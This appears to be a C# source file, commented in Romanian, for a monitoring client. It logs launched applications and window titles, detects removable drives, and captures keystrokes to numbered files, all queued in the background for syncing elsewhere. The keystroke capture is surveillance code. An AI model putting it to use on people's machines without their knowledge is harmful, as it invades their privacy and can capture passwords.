using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;

namespace ClientAps
{
    /*
     * Managerul ce se ocupa cu functionalitatile de inregistrare a proceselor lansate in executie si cu inregistrarea activitatii tastaturii
     */
     class ManagerActivityClient
    {
        //MEMBRII
        private static List<_package> lista_activitati;//stocarea pachetelor cu procesele executate
        private static List<_package> start_point;//procesele detectate la start-ul aplicatiei ca fiind deschise
        private static List<string> info_added;
        private static readonly object _locker = new object();//mutex
        private Thread worker= null; 
        private Thread recorder = null;
        private Thread analizerPorts = null;
        private static bool signal_stop;// semnalul de incetare monitorizare
        private static int step = 0;//variabila pentru marcarea primei iteratii in obtinerea datelor (stocarea in cadrul start_point)
        private static int counter;//counter pentru nr de fisiere ce contin tastele apasate


        //METODE
        public ManagerActivityClient()
        {
            lista_activitati = new List<_package>();
            start_point = new List<_package>();
            try
            {
                signal_stop = true;

                ThreadStart listener = new ThreadStart(startActivity);//thread-ul pentru analiza proceselor
                worker = new Thread(listener);
                worker.IsBackground = true;
                worker.Start();

                ThreadStart recordKeyboard = new ThreadStart(startActivityPh);//thread-ul pentru inregistrarea activitatii perifericelor
                recorder = new Thread(recordKeyboard);
                recorder.IsBackground = true;
                recorder.Start();

                ThreadStart detectorModem = new ThreadStart(startActivityPorts);
                analizerPorts = new Thread(detectorModem);
                analizerPorts.IsBackground = true;
                analizerPorts.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message.ToString());
                Console.ReadLine();
                Environment.Exit(0);
            }
        }

        private static void startActivityPorts()
        {
            info_added = new List<string>();
            Thread.CurrentThread.IsBackground = true;
            while (signal_stop)
            {
                ManagementClass interogare = new ManagementClass("Win32_DiskDrive");
                var portsDrives = interogare.GetInstances();

                foreach (var modem in portsDrives)
                {
                    int next_step = 0;
                    if (!Convert.ToString(modem["MediaType"]).ToLower().Contains("fixed"))
                    {
                        string infs= Convert.ToString(modem["Description"])+"~"+
                                           Convert.ToString(modem["Model"])+"~" +   
                                            modem["Size"] ;

                        
                        foreach(var detalii in info_added)
                        {
                            if(detalii.Equals(infs))
                            {
                                next_step = 1;
                                break;
                            }
                        }
                        if (next_step == 0)
                        {
                            set_information_ports(infs);
                            info_added.Add(infs);
                        }
                        Thread.Sleep(500);
                    }
                }
               // Console.WriteLine(removableDisks.Count);
                //Console.WriteLine(removableDisks[0]);
                //Console.WriteLine(removableDisks[1]);
            }

        }
        private static void startActivityPh()
        {
            Thread.CurrentThread.IsBackground = true;
            while (signal_stop)
            { 
                string fileKeyboard = "keyboard.txt";
                Thread thread = new Thread(() => RecordKeyboard.CatchMessages(fileKeyboard));
                thread.Start();
                thread.Join();
                var nrOfCharacters = File.ReadAllLines(@"keyboard.txt").Sum(s => s.Length);
                string lastLine = null;
                if(nrOfCharacters>1)
                {
                    OrgInformation();
                   
                }else if(nrOfCharacters==1)
                {
                    lastLine = File.ReadLines(@"keyboard.txt").LastOrDefault();
                    if(!lastLine.Equals("0"))
                    {
                        OrgInformation();
                    }
                    else
                    {
                        File.Delete(@"keyboard.txt");
                    }
                }
                else
                {
                    File.Delete(@"keyboard.txt");
                }
               // Console.WriteLine("Nr caractere " + nrOfCharacters + " si speciale " + lastLine);
                Thread.Sleep(500);
            }
        }
        private static void startActivity()
        {      
            Thread.CurrentThread.IsBackground = true;
            while (signal_stop)
            {
                Process[] processes = Process.GetProcesses();
                Process.GetCurrentProcess();
                foreach (Process process in processes)
                {
                    if (process.MainWindowTitle.Length > 0)
                    {
                        set_information(process.Id);
                    }
                }
                step = 1;
                Thread.Sleep(500);
            }
        }  
        private static void set_information_ports(string info)
        {
            Dictionary<string, string> keyboardDictionary = new Dictionary<string, string>()
            {
                 {
                    "infoModem",
                     info.ToString()
                 }
            };
            _package package_new = (_package)new usbActivity();
            package_new.set_package(keyboardDictionary);
            lock (_locker)
            {
                lista_activitati.Add(package_new);
            }
        }
        private static void set_information_keyboard(string filename)
        {
            Dictionary<string, string> keyboardDictionary = new Dictionary<string, string>()
            {
                 {
                    "filenameKeys",
                     filename.ToString()
                 }
            };
            _package package_new = (_package)new peripheralsActivity();
            package_new.set_package(keyboardDictionary);
            lock (_locker)
            {
                lista_activitati.Add(package_new);
            }
        }
        private static void set_information(int process_Id)
        {
            Process processById = Process.GetProcessById(process_Id);
            Dictionary<string, string> processDictionary = new Dictionary<string, string>()
            {
                 {
                    "processName",
                     processById.ProcessName.ToString()
                 },
                 {
                    "aplicationType",
                     get_apps_name(process_Id)
                 },
                 {
                    "accesedTime",
                    processById.StartTime.ToString()
                 },
                 {
                    "descrpt",
                    get_describe(process_Id)
                 }
            };
            if(!verify_accesed_time(processById.StartTime.ToString()))
            {
                _package package_new = (_package)new processActivity();
                package_new.set_package(processDictionary);
                //Console.WriteLine(package_new.get_package_inf());
                if(step==0)
                {
                    start_point.Add(package_new);//lista proceselor care sunt deschise inainte de monitorizare
                }
                else
                {
                    lock (_locker)
                    {
                        lista_activitati.Add(package_new);
                    }
                }
            }
           
        }
        private static Boolean verify_accesed_time(string process_time)
        {
            foreach (_package packet_testat in start_point)
            {
                if (process_time.Equals(packet_testat.get_accesed_time()))
                {
                    return true;
                }
            }
            lock (_locker)
            {
                foreach (_package packet_testat in lista_activitati)
                {
                    if (process_time.Equals(packet_testat.get_accesed_time()))
                    {
                        return true;
                    }
                }
                return false;
            };          
        }
        private static string get_describe(int process_Id)
        {
            Process my_proc = Process.GetProcessById(process_Id);
            if (my_proc.MainWindowTitle.Length > 0)
            {
                string[] componentsName = my_proc.MainWindowTitle.ToString().Split('-');
                int step_describe = componentsName.Length;
                string info = null;
                for (int i = 0; i < step_describe - 1; i++)
                {
                    if (i == 0)
                    {
                        info = componentsName[i];
                    }
                    else
                    {
                        info = info + "-" + componentsName[i];
                    }
                }
                return info;
            }
                return null;
        }
        private static string get_apps_name(int process_Id)
        {
            Process my_proc = Process.GetProcessById(process_Id);
            if (my_proc.MainWindowTitle.Length > 0)
            {
                string[] componentsName = my_proc.MainWindowTitle.ToString().Split('-');
                int length = componentsName.Length;
                if (componentsName[length - 1][0] == ' ')
                {
                    componentsName[length - 1] = componentsName[length - 1].Substring(1);
                    return (componentsName[length - 1].ToString());
                }
                else
                {
                    return (componentsName[length - 1].ToString());
                }

            }
            return null;
        }
        private static void OrgInformation()
        {
           
           string FileKeys = @Directory.GetCurrentDirectory().ToString() + @"\keyboard.txt";
           if(File.Exists(FileKeys))
            {
                if (check_keyboard_directory())
                {
                    string finalName = Directory.GetCurrentDirectory().ToString() + @"\KeyboardDir\" + "keyboard" + counter + ".txt";
                    string curent = @Directory.GetCurrentDirectory().ToString() + @"\keyboard.txt";
                    if (File.Exists(FileKeys))
                    {
                        File.Delete(finalName);
                        File.Move(curent, finalName);
                    }
                    else
                    {
                        File.Move(curent, finalName);
                    }
                    
                    set_information_keyboard(finalName);
                    counter++;
                }
                else
                {
                    Console.WriteLine("Eroare cu folderul pentru screenshot-uri");
                }

            }
        }     
        private static bool check_keyboard_directory()
        {
            string path = @"KeyboardDir";
            try
            {
                if (Directory.Exists(path))
                {
                    return true;
                }

                DirectoryInfo dir = Directory.CreateDirectory(path);
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
        public void sync_list(_backpack datas)
        {
            lock (_locker)
            {
                foreach (_package pachet_selectat in lista_activitati.ToArray())
                {
                    if (!pachet_selectat.verify_status_package())
                    {
                        pachet_selectat.set_status_package(true);
                        datas.add_package(pachet_selectat);
                    }
                }
            }
        }
    
    }
}
